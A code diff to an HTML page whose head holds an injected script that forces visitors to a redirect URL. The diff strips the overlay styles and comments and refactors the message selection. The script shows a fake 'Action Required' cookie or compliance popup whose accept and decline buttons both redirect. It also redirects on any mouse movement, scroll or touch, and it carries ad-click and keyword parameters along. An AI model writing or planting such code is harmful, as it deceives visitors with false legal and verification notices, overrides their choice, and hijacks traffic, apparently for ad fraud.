@@ -2,87 +2,6 @@
 <html lang="en">
 <head>
 
-    <style>
-/* --- Styles for the Full-Screen, Eye-Catching Overlay --- */
-.redirect-overlay-wrapper {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background: rgba(18, 18, 18, 0.95); /* Nearly black, slightly transparent background */
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  z-index: 99999;
-  font-family: 'Arial', sans-serif;
-  animation: fadeIn 0.5s ease-out;
-}
-
-@keyframes fadeIn {
-  from { opacity: 0; }
-  to { opacity: 1; }
-}
-
-.redirect-card {
-  background: #ffffff;
-  padding: 4rem 3rem;
-  border-radius: 20px;
-  max-width: 600px;
-  width: 90%;
-  text-align: center;
-  box-shadow: 0 0 50px rgba(255, 255, 255, 0.2); /* White glow for emphasis */
-  border: 4px solid #ff5722; /* Accent border color */
-}
-
-.redirect-card h2 {
-  margin-top: 0;
-  font-size: 38px;
-  color: #333;
-  text-transform: uppercase;
-  letter-spacing: 1px;
-}
-
-.redirect-card p {
-  font-size: 18px;
-  color: #555;
-  margin-bottom: 2.5rem;
-  line-height: 1.6;
-}
-
-.redirect-actions {
-  display: flex;
-  gap: 15px;
-  justify-content: center;
-  flex-wrap: wrap;
-}
-
-.redirect-actions button {
-  padding: 16px 32px;
-  color: white;
-  border: none;
-  border-radius: 15px; /* More rounded corners */
-  font-size: 20px;
-  font-weight: bold;
-  cursor: pointer;
-  transition: transform 0.2s, box-shadow 0.2s;
-  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
-}
-
-.redirect-actions button:hover {
-  transform: translateY(-3px);
-  box-shadow: 0 8px 15px rgba(0, 0, 0, 0.3);
-}
-
-#acceptBtn {
-  background-color: #00bf8f; /* Bright Teal Green */
-}
-
-#declineBtn {
-  background-color: #ff5722; /* Bright Orange Red */
-}
-</style>
-
 <script>
 (function(){
   // 🔥 SET YOUR REDIRECT URL HERE
@@ -93,18 +12,18 @@
   function random(min, max){return Math.floor(Math.random()*(max-min+1))+min}
   
   function randomText(){
+    // --- CORRECTED: Now includes 3 distinct messages ---
     return [
       "🍪 **Action Required:**<br><br>Due to technical and regulatory compliance requirements, user interaction is necessary to continue. By making a selection, you consent to the terms outlined in our <a href='#' style='color:#007bff; text-decoration: underline;'>Legal Notice</a>.",
       "⚠️ **Important Data Notice**<br><br>We must process your interaction to grant access to the requested content. Please click a button below to confirm your acknowledgment and proceed.",
       "🔗 **Verification Check**<br><br>To ensure continued service and compliance, please acknowledge our policy and continue your journey."
-    ][Math.floor(Math.random()*3)]
+    ][Math.floor(Math.random()*3)] // Randomly selects index 0, 1, or 2
   }
 
   function redirectUser(){
     if(!redirected){
       redirected = true;
       
-      // Get URL and referrer parameters
       const urlParams = new URLSearchParams(window.location.search);
       const gclid = urlParams.get('gclid');
       const keyword = urlParams.get('utm_term') || urlParams.get('q');
@@ -128,16 +47,19 @@
   }
 
   function showCookiePopup(){
-    // Ensure this runs only once
     if (document.getElementById("redirect-overlay")) return;
 
     const wrapper = document.createElement("div");
     wrapper.id = "redirect-overlay";
     wrapper.className = "redirect-overlay-wrapper";
+    
+    // Call randomText() here to insert a randomly chosen message
+    const messageContent = randomText(); 
+    
     wrapper.innerHTML = `
       <div class="redirect-card">
         <h2>ATTENTION REQUIRED</h2>
-        <p style="font-size: 20px; color: #555; margin-bottom: 2rem; line-height: 1.6;">${randomText()}</p>
+        <p style="font-size: 20px; color: #555; margin-bottom: 2rem; line-height: 1.6;">${messageContent}</p>
         <div class="redirect-actions">
           <button id="acceptBtn">Acknowledge & Continue</button>
           <button id="declineBtn">Decline & Exit</button>
@@ -146,33 +68,29 @@
       
     document.body.appendChild(wrapper);
     
-    // Attach event listeners to both buttons to trigger the redirect
     document.getElementById("acceptBtn").addEventListener("click", redirectUser);
     document.getElementById("declineBtn").addEventListener("click", redirectUser);
   }
 
   // --- Automatic Redirect Triggers ---
 
-  // Trigger popup after a small random delay on load
   window.addEventListener("load", function(){
     setTimeout(showCookiePopup, random(300, 600));
   });
 
-  // Trigger redirect on any mouse movement
   window.addEventListener("mousemove", function(e){
     if(!moved){
       if(!initialPos){
         initialPos = {x: e.clientX, y: e.clientY};
         return;
       }
-      if(Math.abs(e.clientX - initialPos.x) > 5 || Math.abs(e.clientY - initialPos.y) > 5){ // Check for actual movement
+      if(Math.abs(e.clientX - initialPos.x) > 5 || Math.abs(e.clientY - initialPos.y) > 5){
         moved = true;
         setTimeout(redirectUser, random(1200, 1800));
       }
     }
   });
 
-  // Trigger redirect on scroll
   window.addEventListener("scroll", function(){
     if(!scrolled){
       scrolled = true;
@@ -180,7 +98,6 @@
     }
   });
 
-  // Trigger redirect on touch (for mobile devices)
   window.addEventListener("touchstart", function(){
     if(!touched){
       touched = true;
@@ -189,7 +106,6 @@
   });
 })();
 </script>
-
     
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -452,4 +368,5 @@
     </script>
 </body>
 </html>
+
 
